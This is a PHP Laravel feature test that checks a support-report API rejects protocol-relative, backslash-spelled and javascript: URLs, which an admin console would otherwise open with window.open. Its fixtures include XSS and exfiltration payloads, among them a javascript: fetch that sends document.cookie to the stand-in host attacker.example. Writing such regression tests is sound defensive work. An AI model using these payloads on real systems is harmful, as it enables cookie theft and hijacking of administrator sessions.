<?php

// Copyright © 2024–2026 Jasper Ford
// SPDX-License-Identifier: AGPL-3.0-or-later
// Author: Jasper Ford
// See NOTICE file for attribution and acknowledgements.

namespace Tests\Laravel\Feature\Security\E065;

use App\Models\User;
use Illuminate\Foundation\Testing\DatabaseTransactions;
use Illuminate\Support\Facades\DB;
use Laravel\Sanctum\Sanctum;
use Tests\Laravel\TestCase;

/**
 * E-065 F-358 — member-controlled off-site addresses must not reach the admin
 * support console's window.open.
 *
 * Two residual holes in the F-281 hardening (158e6ccbb):
 *   1. safePageUrl() accepted anything starting with "/", so a PROTOCOL-RELATIVE
 *      address ("//attacker.example/x", and its backslash spelling "/\x") was
 *      stored and resolves off-site: window.open('//attacker.example/collect')
 *      from https://app.project-nexus.ie/admin goes to https://attacker.example.
 *   2. sentry_issue_url was written from the same request body in the same
 *      create() call with only nullableString() — no scheme check at all — while
 *      the admin console opens it exactly as it opens page_url.
 *
 * Attacker: any signed-in ordinary member of the community.
 *
 * NOT TESTED HERE, and deliberately not claimed either way: whether a browser
 * evaluates a `javascript:` URL passed to window.open(..., 'noopener'). E-065
 * left that open in both directions. The fix closes both server-side holes so
 * the question stops mattering; no browser behaviour was driven.
 */
class F358SupportReportUrlSchemeTest extends TestCase
{
    use DatabaseTransactions;

    private function member(): User
    {
        return User::factory()->forTenant($this->testTenantId)->create([
            'status' => 'active',
            'is_approved' => true,
            'role' => 'member',
        ]);
    }

    /** @param array<string,mixed> $extra */
    private function submit(User $actor, array $extra): object
    {
        Sanctum::actingAs($actor, ['*']);

        $response = $this->apiPost('/v2/support/reports', array_merge([
            'summary' => 'F358 synthetic report',
            'description' => 'F358 synthetic description body, long enough to pass validation.',
            'impact' => 'minor',
        ], $extra));

        $this->assertSame(201, $response->status(), 'report accepted: ' . $response->getContent());

        $reference = $response->json('data.report.reference');
        $this->assertIsString($reference, 'reference returned');

        $row = DB::table('support_reports')
            ->where('tenant_id', $this->testTenantId)
            ->where('reference', $reference)
            ->first(['page_url', 'route', 'sentry_issue_url']);

        $this->assertNotNull($row, 'the report row was stored');

        return $row;
    }

    public function test_a_protocol_relative_page_address_is_refused(): void
    {
        $row = $this->submit($this->member(), [
            'page_url' => '//attacker.example/collect?stolen=1',
            'route' => '/marketplace',
        ]);

        $this->assertNull(
            $row->page_url,
            'A protocol-relative address starts with "/" but resolves off-site, so it must not be stored.'
        );
    }

    public function test_the_backslash_spelling_of_a_protocol_relative_page_address_is_refused(): void
    {
        foreach (['/\\attacker.example/collect', '\\/attacker.example/collect', '\\\\attacker.example/collect'] as $address) {
            $row = $this->submit($this->member(), ['page_url' => $address]);

            $this->assertNull(
                $row->page_url,
                "The URL parser treats \\ as / for special schemes, so {$address} resolves off-site and must not be stored."
            );
        }
    }

    public function test_a_javascript_url_in_the_sentry_issue_field_is_refused(): void
    {
        $row = $this->submit($this->member(), [
            'sentry_issue_url' => 'javascript:fetch("//attacker.example/"+document.cookie)',
        ]);

        $this->assertNull(
            $row->sentry_issue_url,
            'The admin console opens this field with window.open, so a non-http(s) scheme must not be stored.'
        );
    }

    public function test_a_protocol_relative_sentry_issue_address_is_refused(): void
    {
        $row = $this->submit($this->member(), [
            'sentry_issue_url' => '//attacker.example/sentry/issue/1',
        ]);

        $this->assertNull(
            $row->sentry_issue_url,
            'A Sentry issue address is always absolute http(s); a protocol-relative one must not be stored.'
        );
    }

    public function test_the_sentry_issue_address_loses_its_query_and_fragment(): void
    {
        $row = $this->submit($this->member(), [
            'sentry_issue_url' => 'https://sentry.io/organizations/nexus/issues/1?token=secret#frag',
        ]);

        $this->assertSame(
            'https://sentry.io/organizations/nexus/issues/1',
            $row->sentry_issue_url,
            'F-281 strips credentials from the query and fragment; this column was missed.'
        );
    }

    public function test_control_the_shapes_the_f281_guard_already_caught_are_still_dropped_and_a_real_page_address_is_still_kept(): void
    {
        $blocked = $this->submit($this->member(), [
            'page_url' => 'javascript:alert(document.cookie)',
        ]);
        $this->assertNull($blocked->page_url, 'CONTROL: a javascript: page address is still dropped');

        $uppercase = $this->submit($this->member(), [
            'page_url' => "  \tJaVaScRiPt:alert(1)",
        ]);
        $this->assertNull($uppercase->page_url, 'CONTROL: whitespace prefixes and uppercase schemes are still dropped');

        $legitimate = $this->submit($this->member(), [
            'page_url' => 'https://app.project-nexus.ie/hour-timebank/marketplace/42?token=secret',
            'route' => '/hour-timebank/marketplace/42?token=secret',
            'sentry_issue_url' => 'https://sentry.io/organizations/nexus/issues/99/',
        ]);

        $this->assertSame(
            'https://app.project-nexus.ie/hour-timebank/marketplace/42',
            $legitimate->page_url,
            'CONTROL: a legitimate absolute page address is kept, with its query stripped'
        );
        $this->assertSame(
            '/hour-timebank/marketplace/42',
            $legitimate->route,
            'CONTROL: the route keeps its path only'
        );
        $this->assertSame(
            'https://sentry.io/organizations/nexus/issues/99/',
            $legitimate->sentry_issue_url,
            'CONTROL: a real Sentry issue address is still kept'
        );

        $siteRelative = $this->submit($this->member(), [
            'page_url' => '/hour-timebank/events/7',
        ]);
        $this->assertSame(
            '/hour-timebank/events/7',
            $siteRelative->page_url,
            'CONTROL: an ordinary site-relative page address is still kept'
        );
    }
}
